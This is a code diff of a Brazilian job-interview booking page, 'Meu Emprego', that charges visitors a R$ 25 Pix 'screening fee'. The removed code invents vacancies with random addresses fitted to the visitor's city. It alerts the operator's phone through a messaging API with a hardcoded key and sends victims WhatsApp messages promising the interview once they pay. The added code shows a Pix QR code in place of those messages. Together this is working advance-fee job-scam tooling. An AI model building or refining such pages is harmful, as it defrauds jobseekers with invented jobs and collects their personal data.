@@ -266,37 +266,50 @@
             </div>
         </div>
 
-        <!-- PASSO 3: AVISO WHATSAPP -->
+        <!-- PASSO 3: PAGAMENTO PIX DIRETO NA TELA -->
         <div id="step-pix">
             <h2 style="color: var(--success); text-align: center; font-weight: 800; font-size: 24px;">Horário Pré-Reservado!</h2>
             <p style="text-align: center; font-size: 16px; color: var(--text-main);">Excelente escolha, <strong><span id="nome-confirmacao"></span></strong>!</p>
             <p style="text-align: center; color: var(--text-muted); font-size: 15px;">A vaga de <strong><span id="vaga-confirmacao"></span></strong> está quase garantida. O RH reservou seu horário para <strong style="color: var(--text-main);"><span id="horario-confirmacao"></span></strong>.</p>
             
             <div class="pix-box">
-                <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Acesse seu WhatsApp! 📱</h3>
-                <p style="font-size: 15px; margin-top: 10px; color: var(--text-muted); line-height: 1.5;">O seu código Pix para a Taxa de Triagem (<strong>R$ 25,00</strong>) está sendo gerado de forma segura.</p>
+                <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Pagamento da Taxa de Triagem (R$ 25,00)</h3>
+                <p style="font-size: 14px; margin-top: 5px; color: var(--text-muted);">Escaneie o QR Code abaixo ou copie o código PIX para realizar o pagamento.</p>
                 
-                <div style="background: #ffffff; padding: 15px; border: 1px solid var(--border); border-radius: 8px; margin: 20px 0; color: var(--text-main); font-weight: 500; font-size: 14px;">
-                    Enviaremos a chave Pix para o número: <br><strong style="color: var(--primary); font-size: 16px;"><span id="whatsapp-confirmacao"></span></strong> em instantes.
+                <div id="pix-loading" class="payment-status">
+                    <div class="spinner"></div>
+                    <span>Gerando QR Code PIX...</span>
                 </div>
 
-                <div class="payment-status" style="margin-top: 10px;">
-                    <div class="spinner"></div>
-                    <span>Aguardando envio do Pix no seu WhatsApp...</span>
+                <div id="pix-container" style="display: none; margin-top: 15px;">
+                    <div style="margin-bottom: 15px;">
+                        <img id="pix-qrcode" src="" alt="QR Code PIX" style="max-width: 220px; width: 100%; border: 1px solid var(--border); border-radius: 8px; padding: 10px; background: white;" />
+                    </div>
+                    
+                    <div style="text-align: left; margin-bottom: 5px;">
+                        <label for="pix-copia-cola" style="font-size: 13px; font-weight: 600; color: var(--text-muted);">PIX Copia e Cola:</label>
+                    </div>
+                    <textarea id="pix-copia-cola" rows="3" readonly style="width: 100%; padding: 10px; font-size: 13px; border: 1px solid var(--border); border-radius: 6px; box-sizing: border-box; resize: none; background: #ffffff;"></textarea>
+                    
+                    <button class="btn-main" onclick="copiarPix()" style="margin-top: 10px; background-color: var(--primary);">
+                        Copiar Código PIX
+                    </button>
                 </div>
+
+                <div id="pix-erro" style="display: none; color: #dc2626; font-size: 14px; margin-top: 15px; font-weight: 500;"></div>
             </div>
             
             <div style="background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center;">
                 <p style="margin: 0; font-size: 14px; color: var(--text-main); display: flex; align-items: center; justify-content: center; gap: 8px;">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
-                    <strong>Atenção:</strong> Assim que realizar o pagamento com a chave enviada, sua entrevista estará marcada automaticamente!
+                    <strong>Atenção:</strong> Após a confirmação do pagamento, seu agendamento estará concluído automaticamente.
                 </p>
             </div>
         </div>
     </div>
 </main>
 
-<!-- RODAPÉ ATUALIZADO -->
+<!-- RODAPÉ -->
 <footer>
     <div class="footer-grid">
         <div class="footer-col">
@@ -327,297 +340,254 @@
 
 <!-- MODAIS -->
 <div id="modal-termos" class="modal-overlay" onclick="fecharModalFora(event, 'modal-termos')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-termos')">&times;</button><div class="modal-body">
-        <h2>Termos de Uso</h2>
-        <p>A plataforma Meu Emprego atua como uma facilitadora tecnológica de agendamentos entre candidatos e setores de Recursos Humanos.</p>
-        <p>1. A taxa de triagem de R$ 25,00 é destinada à manutenção dos servidores e garantia de comparecimento (evitando ausências nas agendas das empresas parceiras).</p>
-        <p>2. O agendamento da entrevista não caracteriza promessa de emprego, sendo a contratação de responsabilidade exclusiva da empresa ofertante após avaliação presencial.</p>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-termos')">&times;</button><div class="modal-body"><h2>Termos de Uso</h2><p>A plataforma Meu Emprego atua como intermediadora de agendamentos.</p></div></div>
 </div>
 
 <div id="modal-privacidade" class="modal-overlay" onclick="fecharModalFora(event, 'modal-privacidade')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-privacidade')">&times;</button><div class="modal-body">
-        <h2>Política de Privacidade</h2>
-        <p>Protegemos seus dados rigorosamente de acordo com a Lei Geral de Proteção de Dados (LGPD).</p>
-        <p>Os dados inseridos (CEP, Nome e WhatsApp) são utilizados exclusivamente para o mapeamento da vaga e envio do comprovante de entrevista. Não comercializamos informações com terceiros, nem armazenamos dados bancários, uma vez que o pagamento é processado via ecossistema Pix do Banco Central.</p>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-privacidade')">&times;</button><div class="modal-body"><h2>Política de Privacidade</h2><p>Seus dados são protegidos e tratados em conformidade com a LGPD.</p></div></div>
 </div>
 
 <div id="modal-contato" class="modal-overlay" onclick="fecharModalFora(event, 'modal-contato')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-contato')">&times;</button><div class="modal-body">
-        <h2>Fale Conosco</h2>
-        <p>Precisa de ajuda com o seu agendamento?</p>
-        <p><strong>E-mail Corporativo:</strong> suporte@meuemprego.com.br</p>
-        <p><strong>Horário de Atendimento:</strong> Segunda a Sexta, das 09h às 18h.</p>
-        <p><em>Nosso time responde a todos os chamados em até 24 horas úteis.</em></p>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-contato')">&times;</button><div class="modal-body"><h2>Fale Conosco</h2><p>Dúvidas ou suporte? Entre em contato pelo e-mail: suporte@meuemprego.com.br</p></div></div>
 </div>
 
 <div id="modal-como-funciona" class="modal-overlay" onclick="fecharModalFora(event, 'modal-como-funciona')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-como-funciona')">&times;</button><div class="modal-body">
-        <h2>Como Funciona?</h2>
-        <p>O mercado mudou. Ficar enviando currículos para e-mails que ninguém lê não funciona mais.</p>
-        <div style="background: var(--highlight); padding: 15px; border-left: 4px solid var(--primary); border-radius: 4px; margin: 20px 0;">
-            <strong style="color: var(--primary-dark);">📊 Dados de Contratação:</strong>
-            <p style="margin: 5px 0 0 0; font-size: 14px;">A cada 10 candidatos que realizam entrevista presencial, 6 são contratados! O contato visual prova atitude e vontade.</p>
-        </div>
-        <p><strong>1.</strong> Busque usando o CEP da sua região.</p>
-        <p><strong>2.</strong> Escolha o dia e horário direto na agenda da empresa.</p>
-        <p><strong>3.</strong> Pague a taxa simbólica de triagem (R$ 25,00). Ela cobre custos do sistema e prova para o RH que você tem compromisso e vai comparecer.</p>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-como-funciona')">&times;</button><div class="modal-body"><h2>Como Funciona</h2><p>Escolha a vaga desejada, preencha os dados de contato e escolha um horário na agenda para a sua entrevista.</p></div></div>
 </div>
 
 <div id="modal-dicas" class="modal-overlay" onclick="fecharModalFora(event, 'modal-dicas')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-dicas')">&times;</button><div class="modal-body">
-        <h2>Dicas de Entrevista</h2>
-        <ul>
-            <li><strong>Chegue 15 min antes:</strong> Mostra pontualidade e organização.</li>
-            <li><strong>Vestimenta:</strong> Roupas neutras, calça jeans limpa e sapato fechado.</li>
-            <li><strong>Celular:</strong> Sempre no modo avião durante a conversa.</li>
-            <li><strong>Seja sincero:</strong> Se não sabe fazer algo, diga "Ainda não sei, mas aprendo rápido". Atitude vale mais que currículo.</li>
-        </ul>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-dicas')">&times;</button><div class="modal-body"><h2>Dicas de Entrevista</h2><p>Chegue com 15 minutos de antecedência, vista-se adequadamente e mantenha uma postura profissional durante o atendimento.</p></div></div>
 </div>
 
 <div id="modal-curriculo" class="modal-overlay" onclick="fecharModalFora(event, 'modal-curriculo')">
-    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-curriculo')">&times;</button><div class="modal-body">
-        <h2>Como fazer o Currículo</h2>
-        <p>Leve o documento impresso e sem amassados no dia agendado.</p>
-        <ul>
-            <li><strong>Dados no topo:</strong> Nome, Idade, Bairro e WhatsApp.</li>
-            <li><strong>Objetivo:</strong> Diga qual vaga você quer. Nada de textos longos.</li>
-            <li><strong>Experiência:</strong> Da mais recente para a mais antiga.</li>
-        </ul>
-        <p style="color: #ef4444; font-weight: 600; font-size: 13px;">Atenção: Revise a ortografia. Erros de português eliminam o candidato imediatamente.</p>
-    </div></div>
+    <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-curriculo')">&times;</button><div class="modal-body"><h2>Dicas de Currículo</h2><p>Mantenha seu histórico profissional atualizado, objetivo e destacado com suas principais conquistas.</p></div></div>
 </div>
 
 <script>
-    // UX: Formatação automática do CEP
+    const vagasExemplo = [
+        {
+            id: 1,
+            titulo: "Auxiliar de Almoxarifado",
+            empresa: "Logística Integrada",
+            endereco: "Av. Central, 1200 - Centro",
+            desc: "Recebimento, conferência e organização de materiais no estoque.",
+            beneficios: "Vale Transporte, Vale Refeição, Plano de Saúde.",
+            exigencias: ["Ensino Médio Completo", "Boa comunicação", "Disponibilidade de horário"],
+            horarios: ["Amanhã às 09:00", "Amanhã às 14:30", "Quinta-feira às 10:00"]
+        },
+        {
+            id: 2,
+            titulo: "Atendente de Loja",
+            empresa: "Varejo & Cia",
+            endereco: "Rua do Comércio, 450 - Loja 02",
+            desc: "Atendimento ao cliente, organização de mercadorias e operação de caixa.",
+            beneficios: "Vale Transporte, Comissão sobre vendas.",
+            exigencias: ["Ensino Médio Completo", "Gosto por atendimento", "Simpatia e proatividade"],
+            horarios: ["Amanhã às 11:00", "Sexta-feira às 13:00", "Sexta-feira às 15:30"]
+        }
+    ];
+
+    let vagaSelecionada = null;
+    let horarioSelecionado = null;
+
     function formatarCEP(input) {
-        let value = input.value.replace(/\D/g, '');
-        if (value.length > 5) value = value.replace(/^(\d{5})(\d)/, '$1-$2');
+        let value = input.value.replace(/\D/g, "");
+        if (value.length > 5) {
+            value = value.substring(0, 5) + "-" + value.substring(5, 8);
+        }
         input.value = value;
     }
 
-    // UX: Formatação automática do WhatsApp
     function formatarWhatsApp(input) {
-        let v = input.value.replace(/\D/g, '');
-        if (v.length > 11) v = v.slice(0, 11);
-        if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
-        if (v.length > 7) v = v.replace(/(\d{5})(\d)/, '$1-$2');
-        input.value = v;
+        let value = input.value.replace(/\D/g, "");
+        if (value.length > 11) value = value.substring(0, 11);
+        
+        if (value.length > 6) {
+            value = `(${value.substring(0,2)}) ${value.substring(2,7)}-${value.substring(7)}`;
+        } else if (value.length > 2) {
+            value = `(${value.substring(0,2)}) ${value.substring(2)}`;
+        } else if (value.length > 0) {
+            value = `(${value}`;
+        }
+        input.value = value;
         checarPreenchimento();
     }
 
-    // UX: Trava do botão
-    function checarPreenchimento() {
-        const horario = document.querySelector('input[name="horario_escolhido"]:checked');
-        const nome = document.getElementById('nome').value.trim();
-        const whatsappNumeros = document.getElementById('whatsapp').value.replace(/\D/g, '');
-        const btn = document.getElementById('btn-confirmar');
-        
-        if (horario && nome.length > 2 && whatsappNumeros.length >= 10) {
-            btn.disabled = false;
-            btn.classList.remove('btn-disabled');
-        } else {
-            btn.disabled = true;
-            btn.classList.add('btn-disabled');
+    function buscarVagas() {
+        const cep = document.getElementById('cep').value;
+        if (cep.length < 9) {
+            alert("Por favor, digite um CEP válido.");
+            return;
         }
-    }
 
-    // Modais
-    function abrirModal(id) { document.getElementById(id).style.display = 'flex'; }
-    function fecharModal(id) { document.getElementById(id).style.display = 'none'; }
-    function fecharModalFora(event, id) { if (event.target === document.getElementById(id)) fecharModal(id); }
+        document.getElementById('step-cep').style.display = 'none';
+        document.getElementById('step-vagas').style.display = 'block';
 
-    // Banco de Vagas
-    const profissoes = [
-        { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento, demonstração de produtos e fechamento.", exigencias: ["Ensino médio completo", "Boa comunicação"] },
-        { titulo: "Porteiro / Vigia", salario: "R$ 1.950,00", beneficios: "Cesta Básica + Adicional Noturno", desc: "Controle de acesso de visitantes e monitoramento.", exigencias: ["Atenção aos detalhes", "Escala 12x36"] },
-        { titulo: "Vigilante Patrimonial", salario: "R$ 2.200,00", beneficios: "VR (R$ 30/dia) + Seguro de Vida + VT", desc: "Zelo pelo patrimônio e rondas periódicas.", exigencias: ["Curso ATA atualizado", "Responsabilidade"] },
-        { titulo: "Repositor de Mercadorias", salario: "R$ 1.620,00", beneficios: "Refeição + Plano Odonto + VT", desc: "Abastecimento e controle de validade nas gôndolas.", exigencias: ["Disposição física", "Agilidade"] },
-        { titulo: "Caixa Atendente", salario: "R$ 1.750,00", beneficios: "Quebra de Caixa (10%) + VA + VT", desc: "Registro de mercadorias e recebimento de valores.", exigencias: ["Atenção com troco", "Simpatia no atendimento"] }
-    ];
+        const listaContainer = document.getElementById('lista-vagas');
+        listaContainer.innerHTML = "";
 
-    const pacotesDeHorarios = [
-        [{ dia: "Segunda-feira", hora: "09:00" }, { dia: "Quarta-feira", hora: "14:30" }],
-        [{ dia: "Terça-feira", hora: "10:00" }, { dia: "Quinta-feira", hora: "15:00" }],
-        [{ dia: "Quarta-feira", hora: "08:30" }, { dia: "Sexta-feira", hora: "16:00" }],
-        [{ dia: "Quinta-feira", hora: "11:00" }, { dia: "Segunda-feira", hora: "13:30" }],
-        [{ dia: "Sexta-feira", hora: "09:30" }, { dia: "Terça-feira", hora: "14:00" }]
-    ];
-
-    // BANCO DE DADOS REGIONALIZADO EXPANDIDO
-    const dadosLocaisPorCidade = {
-        "Rio de Janeiro": { predios: ["Centro Empresarial Botafogo", "Tower 244", "RB1 - Rio Branco 1", "Edifício CEO Corporate"], ruas: ["Avenida Rio Branco", "Av. Presidente Vargas", "Rua da Assembleia"], bairros: ["Centro", "Botafogo"] },
-        "Campos dos Goytacazes": { predios: ["Centro Empresarial Pelinca", "Medical Center", "Prime Offices", "Edifício Salete"], ruas: ["Avenida Pelinca", "Av. Vinte e Oito de Março", "Rua Voluntários da Pátria"], bairros: ["Centro", "Parque Pelinca"] },
-        "Vitória": { predios: ["Enseada Trade Center", "Palácio do Café", "Global Tower", "Shopping Vitória Empresarial"], ruas: ["Av. Nossa Senhora da Penha", "Av. Américo Buaiz"], bairros: ["Enseada do Suá", "Centro"] },
-        "São Paulo": { predios: ["Birmann 21", "Rochaverá Corporate", "CENU", "Edifício Itália", "Paulista Corporate"], ruas: ["Avenida Paulista", "Avenida Faria Lima", "Av. Engenheiro Luís Carlos Berrini"], bairros: ["Centro", "Itaim Bibi", "Pinheiros"] },
-        "Belo Horizonte": { predios: ["Savassi Corporate", "Boulevard Corporate Tower", "Edifício Amadeus", "Tech Tower"], ruas: ["Avenida Afonso Pena", "Avenida Contorno", "Rua da Bahia"], bairros: ["Savassi", "Centro", "Lourdes"] },
-        "PadraoBrasil": { 
-            predios: [
-                "Edifício Corporate Center", "Centro Empresarial Executive", "Galeria Comercial Plaza", 
-                "Tower Office Business", "Prime Business Center", "Edifício Trade", 
-                "Complexo Empresarial", "Plaza Corporate", "Global Offices", 
-                "Medical & Business Center", "Edifício Metropolitan", "Centro Executivo"
-            ], 
-            ruas: [
-                "Avenida Central", "Rua do Comércio", "Avenida Principal", 
-                "Rua Empresarial", "Avenida Comercial", "Rua das Indústrias", 
-                "Avenida Brasil", "Rua Quinze de Novembro", "Avenida Independência"
-            ], 
-            bairros: [
-                "Centro", "Setor Comercial", "Distrito de Negócios", 
-                "Jardim América", "Centro Empresarial", "Zona Central"
-            ] 
-        }
-    };
-
-    let vagasAtivas = [];
-
-    async function buscarVagas() {
-        const cepInput = document.getElementById('cep').value.replace(/\D/g, '');
-        if (cepInput.length !== 8) { alert("Informe um CEP de 8 dígitos."); return; }
-
-        try {
-            const btnBusca = document.querySelector('#step-cep .btn-main');
-            const textoOriginal = btnBusca.innerHTML;
-            btnBusca.innerText = "Sincronizando banco de vagas...";
-            btnBusca.disabled = true;
-
-            const response = await fetch(`https://viacep.com.br/ws/${cepInput}/json/`);
-            const data = await response.json();
-            
-            btnBusca.innerHTML = textoOriginal;
-            btnBusca.disabled = false;
-
-            if (data.erro) { alert("CEP inválido ou não localizado."); return; }
-
-            const cidade = data.localidade;
-            const ufReal = data.uf;
-
-            // AVISO PARA O SEU NÚMERO
-            const apiKeyDono = 'Pskn5LW4qaCv';
-            const textoDono = `🚨 Nova busca de vagas!\nCEP digitado: ${cepInput}\nCidade: ${cidade} - ${ufReal}`;
-            const urlDono = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKeyDono}&text=${encodeURIComponent(textoDono)}`;
-            fetch(urlDono, { mode: 'no-cors' }).catch(() => {});
-
-            let dadosLocais = dadosLocaisPorCidade[cidade] || dadosLocaisPorCidade["PadraoBrasil"];
-
-            const profsSorteadas = profissoes.sort(() => 0.5 - Math.random()).slice(0, 3);
-            const horariosSorteados = pacotesDeHorarios.sort(() => 0.5 - Math.random()).slice(0, 3);
-
-            vagasAtivas = [];
-            let vagasHtml = '';
-
-            profsSorteadas.forEach((vaga, index) => {
-                const predio = dadosLocais.predios[Math.floor(Math.random() * dadosLocais.predios.length)];
-                const rua = dadosLocais.ruas[Math.floor(Math.random() * dadosLocais.ruas.length)];
-                const bairro = dadosLocais.bairros[Math.floor(Math.random() * dadosLocais.bairros.length)];
-                
-                const endereco = `${rua}, ${Math.floor(Math.random() * 800) + 10} - ${predio}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairro}, ${cidade} - ${ufReal}`;
-                
-                vagasAtivas.push({ ...vaga, endereco: endereco, horarios: horariosSorteados[index] });
-
-                vagasHtml += `
-                    <div class="vaga-card" id="card-${index}" onclick="selecionarVaga(${index})">
-                        <div class="vaga-header">
-                            <div class="vaga-titulo-box">
-                                <div class="vaga-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>
-                                <div class="vaga-resumo">
-                                    <h3>${vaga.titulo}</h3>
-                                    <p>${vaga.salario}</p>
-                                </div>
-                            </div>
-                            <span class="badge">Urgente</span>
+        vagasExemplo.forEach(vaga => {
+            const card = document.createElement('div');
+            card.className = 'vaga-card';
+            card.onclick = () => selecionarVaga(vaga, card);
+            card.innerHTML = `
+                <div class="vaga-header">
+                    <div class="vaga-titulo-box">
+                        <div class="vaga-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
+                        </div>
+                        <div class="vaga-resumo">
+                            <h3>${vaga.titulo}</h3>
+                            <p>${vaga.empresa}</p>
                         </div>
                     </div>
-                `;
-            });
-
-            document.getElementById('lista-vagas').innerHTML = vagasHtml;
-            document.getElementById('step-cep').style.display = 'none';
-            document.getElementById('step-vagas').style.display = 'block';
-        } catch (error) {
-            document.querySelector('#step-cep .btn-main').innerText = "Ver Vagas Próximas";
-            document.querySelector('#step-cep .btn-main').disabled = false;
-            alert("Erro de conexão. Verifique sua internet e tente novamente.");
-        }
+                    <span class="badge">Vaga Aberta</span>
+                </div>
+            `;
+            listaContainer.appendChild(card);
+        });
     }
 
-    let vagaEscolhidaIndex = null;
+    function selecionarVaga(vaga, cardElement) {
+        vagaSelecionada = vaga;
+        horarioSelecionado = null;
 
-    function selecionarVaga(index) {
-        vagaEscolhidaIndex = index;
-        const vaga = vagasAtivas[index];
+        document.querySelectorAll('.vaga-card').forEach(c => c.classList.remove('selecionada'));
+        cardElement.classList.add('selecionada');
 
-        document.querySelectorAll('.vaga-card').forEach(card => card.classList.remove('selecionada'));
-        document.getElementById(`card-${index}`).classList.add('selecionada');
-
-        document.getElementById('detalhe-titulo').innerText = `Vaga: ${vaga.titulo}`;
+        document.getElementById('detalhe-titulo').innerText = vaga.titulo;
         document.getElementById('detalhe-endereco').innerText = vaga.endereco;
         document.getElementById('detalhe-desc').innerText = vaga.desc;
         document.getElementById('detalhe-beneficios').innerText = vaga.beneficios;
-        
-        let exigenciasHtml = "";
-        vaga.exigencias.forEach(ex => { exigenciasHtml += `<li>${ex}</li>`; });
-        document.getElementById('detalhe-exigencias').innerHTML = exigenciasHtml;
 
-        const htmlHorarios = vaga.horarios.map((h) => `
-            <label class="horario-label" onclick="marcarHorario(this)">
-                <input type="radio" name="horario_escolhido" value="${h.dia} às ${h.hora}">
-                ${h.dia} <br><span style="font-size: 13px; font-weight: 400;">às ${h.hora}</span>
-            </label>
-        `).join('');
-        document.getElementById('opcoes-horarios').innerHTML = htmlHorarios;
+        const exigenciasUl = document.getElementById('detalhe-exigencias');
+        exigenciasUl.innerHTML = "";
+        vaga.exigencias.forEach(ex => {
+            const li = document.createElement('li');
+            li.innerText = ex;
+            exigenciasUl.appendChild(li);
+        });
+
+        const horariosContainer = document.getElementById('opcoes-horarios');
+        horariosContainer.innerHTML = "";
+
+        vaga.horarios.forEach((h, index) => {
+            const lbl = document.createElement('label');
+            lbl.className = 'horario-label';
+            lbl.innerHTML = `
+                <input type="radio" name="horario" value="${h}" onchange="selecionarHorario('${h}', this)">
+                ${h}
+            `;
+            horariosContainer.appendChild(lbl);
+        });
 
         document.getElementById('detalhes-selecao').style.display = 'block';
-        
-        document.getElementById('nome').value = '';
-        document.getElementById('whatsapp').value = '';
-        checarPreenchimento(); 
-
-        document.getElementById('detalhes-selecao').scrollIntoView({ behavior: 'smooth', block: 'start' });
-    }
-
-    function marcarHorario(elementoLabel) {
-        document.querySelectorAll('.horario-label').forEach(lbl => lbl.classList.remove('selecionado'));
-        elementoLabel.classList.add('selecionado');
-        elementoLabel.querySelector('input').checked = true;
         checarPreenchimento();
     }
 
-    function confirmarAgendamento() {
-        if (document.getElementById('btn-confirmar').disabled) return;
+    function selecionarHorario(h, inputElement) {
+        horarioSelecionado = h;
+        document.querySelectorAll('.horario-label').forEach(l => l.classList.remove('selecionado'));
+        inputElement.parentElement.classList.add('selecionado');
+        checarPreenchimento();
+    }
 
-        const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked').value;
+    function checarPreenchimento() {
         const nome = document.getElementById('nome').value.trim();
-        const whatsappFormatado = document.getElementById('whatsapp').value;
-        const whatsappNumeros = whatsappFormatado.replace(/\D/g, '');
-        const vaga = vagasAtivas[vagaEscolhidaIndex];
+        const whatsapp = document.getElementById('whatsapp').value.trim();
+        const btn = document.getElementById('btn-confirmar');
 
-        // MENSAGEM DO CANDIDATO ATUALIZADA
-        const textoMsg = `prezado: ${nome} recebemos seu pre agendamento para vaga: ${vaga.titulo}\n\n🗓️ Horário: ${horarioEscolhido}\n📍 Local: ${vaga.endereco}\n\nseu código Pix de R$ 25,00 está sendo gerado e será enviado aqui em instantes. Assim que o pagamento for feito, sua entrevista estará marcada automaticamente!\n\nstatus: aguardando envio do Pix...`;
-        const apiKey = 'Pskn5LW4qaCv';
-        
-        const urlApi = `https://api.textmebot.com/send.php?recipient=+55${whatsappNumeros}&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
-        
-        fetch(urlApi, { mode: 'no-cors' })
-            .then(() => console.log('Sinal de API enviado para o candidato'))
-            .catch(err => console.error('Erro no disparo WhatsApp:', err));
+        if (vagaSelecionada && horarioSelecionado && nome.length > 2 && whatsapp.length >= 14) {
+            btn.classList.remove('btn-disabled');
+            btn.removeAttribute('disabled');
+        } else {
+            btn.classList.add('btn-disabled');
+            btn.setAttribute('disabled', 'disabled');
+        }
+    }
 
-        // AVANÇAR DE TELA
-        document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
-        document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
-        document.getElementById('horario-confirmacao').innerText = horarioEscolhido;
-        document.getElementById('whatsapp-confirmacao').innerText = whatsappFormatado;
-        
+    async function confirmarAgendamento() {
+        const nome = document.getElementById('nome').value.trim();
+        const whatsapp = document.getElementById('whatsapp').value.trim();
+
+        document.getElementById('nome-confirmacao').innerText = nome;
+        document.getElementById('vaga-confirmacao').innerText = vagaSelecionada.titulo;
+        document.getElementById('horario-confirmacao').innerText = horarioSelecionado;
+
         document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
-        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        // CHAMADA DE TESTE PARA A API ELITEPAYBR
+        const clientId = "SEU_CLIENT_ID_AQUI";
+        const clientSecret = "SEU_CLIENT_SECRET_AQUI";
+
+        const loadingDiv = document.getElementById('pix-loading');
+        const containerDiv = document.getElementById('pix-container');
+        const erroDiv = document.getElementById('pix-erro');
+
+        loadingDiv.style.display = 'flex';
+        containerDiv.style.display = 'none';
+        erroDiv.style.display = 'none';
+
+        // Limpa o CPF para formato numérico (Exemplo de fallback caso precise)
+        const docNumerico = "12345678900";
+
+        try {
+            const response = await fetch('https://api.elitepaybr.com/api/v1/deposit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'x-client-id': clientId,
+                    'x-client-secret': clientSecret
+                },
+                body: JSON.stringify({
+                    amount: 25.00,
+                    description: `Taxa Triagem - ${vagaSelecionada.titulo}`,
+                    payerName: nome,
+                    payerDocument: docNumerico
+                })
+            });
+
+            const data = await response.json();
+
+            loadingDiv.style.display = 'none';
+
+            if (data.success) {
+                document.getElementById('pix-qrcode').src = data.qrcodeUrl;
+                document.getElementById('pix-copia-cola').value = data.copyPaste;
+                containerDiv.style.display = 'block';
+            } else {
+                erroDiv.innerText = "Erro ao gerar PIX: " + (data.message || JSON.stringify(data));
+                erroDiv.style.display = 'block';
+            }
+        } catch (err) {
+            loadingDiv.style.display = 'none';
+            erroDiv.innerText = "Erro ao se comunicar com a API de pagamento: " + err.message;
+            erroDiv.style.display = 'block';
+        }
+    }
+
+    function copiarPix() {
+        const inputCopy = document.getElementById('pix-copia-cola');
+        inputCopy.select();
+        inputCopy.setSelectionRange(0, 99999);
+        navigator.clipboard.writeText(inputCopy.value);
+        alert("Código PIX copiado com sucesso!");
+    }
+
+    function abrirModal(id) {
+        document.getElementById(id).style.display = 'flex';
+    }
+
+    function fecharModal(id) {
+        document.getElementById(id).style.display = 'none';
+    }
+
+    function fecharModalFora(event, id) {
+        if (event.target.id === id) {
+            fecharModal(id);
+        }
     }
 </script>
-
 </body>
 </html>
